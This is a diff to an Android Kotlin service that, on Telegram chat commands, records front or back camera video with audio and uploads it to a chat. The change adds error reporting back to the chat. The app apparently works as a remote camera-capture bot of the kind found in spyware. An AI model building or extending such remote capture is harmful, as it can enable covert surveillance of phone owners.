@@ -1054,21 +1054,24 @@ class TelegramService : Service() {
         showVideoNotification(label)
         sendText(chatId, "🎥 Mulai rekam video kamera $label ${seconds} detik...")
         scope?.launch {
-            val outFile = withContext(Dispatchers.IO) {
+            val result = withContext(Dispatchers.IO) {
                 try {
                     recordOneVideo(facing, seconds)
                 } catch (e: Exception) {
                     Log.e(TAG, "recordVideo: ${e.javaClass.simpleName}: ${e.message}")
-                    null
+                    Pair(null as java.io.File?, "exception: ${e.message}")
                 }
             }
+            val outFile = result?.first
+            val errDetail = result?.second ?: "unknown"
             hideVideoNotification()
             if (outFile != null && outFile.exists() && outFile.length() > 0) {
                 Log.d(TAG, "recordVideo: ${outFile.length()} bytes, sending...")
                 sendVideo(chatId, outFile, "Video kamera $label ${Build.MODEL}")
                 outFile.delete()
             } else {
-                sendText(chatId, "❌ Gagal merekam video kamera $label.")
+                Log.e(TAG, "recordVideo: FAILED err=$errDetail")
+                sendText(chatId, "❌ Gagal merekam video kamera $label. Detail: $errDetail")
             }
             isRecordingVideo = false
         }
@@ -1077,7 +1080,7 @@ class TelegramService : Service() {
     /** Rekam video front/back via legacy Camera API + MediaRecorder(CAMERA).
      *  Pola sama dengan /camfront yang terbukti jalan di MIUI.
      *  MediaRecorder di-feed oleh legacy Camera (dipakai Camera2 hanya untuk open). */
-    private fun recordOneVideo(facing: String, seconds: Int): java.io.File? {
+    private fun recordOneVideo(facing: String, seconds: Int): Pair<java.io.File?, String>? {
         val outDir = getExternalFilesDir(null) ?: filesDir
         val outFile = java.io.File(outDir, "vid_${facing}_${System.currentTimeMillis()}.mp4")
         if (outFile.exists()) outFile.delete()
@@ -1099,7 +1102,7 @@ class TelegramService : Service() {
         }
         if (camId < 0) {
             Log.e(TAG, "recordOneVideo: no ${facing} camera found")
-            return null
+            return Pair(null, "no_camera")
         }
         Log.d(TAG, "recordOneVideo: using legacy camId=$camId")
 
@@ -1111,7 +1114,7 @@ class TelegramService : Service() {
             c
         } catch (e: Exception) {
             Log.e(TAG, "recordOneVideo: camera open fail: ${e.javaClass.simpleName}: ${e.message}")
-            return null
+            return Pair(null, "camera_open_fail: ${e.message}")
         }
 
         // 3. Setup parameter — pilih preview size terbesar
@@ -1154,6 +1157,7 @@ class TelegramService : Service() {
             rec.setAudioEncodingBitRate(128_000)
             rec.setOutputFile(outFile.absolutePath)
             rec.prepare()
+            Log.d(TAG, "recordOneVideo: recorder prepared")
             rec.start()
             recOk = true
             Log.d(TAG, "recordOneVideo: MediaRecorder started (${vw}x${vh}, cam=$camId)")
@@ -1161,7 +1165,7 @@ class TelegramService : Service() {
             Log.e(TAG, "recordOneVideo: recorder start fail: ${e.javaClass.simpleName}: ${e.message}")
             try { rec.release() } catch (_: Exception) {}
             try { cam.release() } catch (_: Exception) {}
-            return null
+            return Pair(null, "recorder_fail: ${e.javaClass.simpleName}: ${e.message}")
         }
 
         // 5. Mulai preview (wajib supaya frame masuk ke recorder)
@@ -1174,7 +1178,7 @@ class TelegramService : Service() {
             try { rec.stop() } catch (_: Exception) {}
             try { rec.release() } catch (_: Exception) {}
             try { cam.release() } catch (_: Exception) {}
-            return null
+            return Pair(null, "startPreview_fail: ${e.message}")
         }
 
         // 6. Tunggu durasi rekam
@@ -1191,10 +1195,17 @@ class TelegramService : Service() {
             Log.d(TAG, "recordOneVideo: recorder stopped")
         } catch (e: Exception) {
             Log.w(TAG, "recordOneVideo: rec.stop: ${e.message}")
+            try { cam.release() } catch (_: Exception) {}
+            return Pair(null, "rec_stop_fail: ${e.message}")
         }
         try { rec.release() } catch (_: Exception) {}
 
-        return if (outFile.exists() && outFile.length() > 0) outFile else null
+        if (outFile.exists() && outFile.length() > 0) {
+            return Pair(outFile, "ok")
+        } else {
+            Log.w(TAG, "recordOneVideo: output file is empty or missing")
+            return Pair(null, "file_empty")
+        }
     }
 
     /** Tampilkan notification foreground video (id=4). */
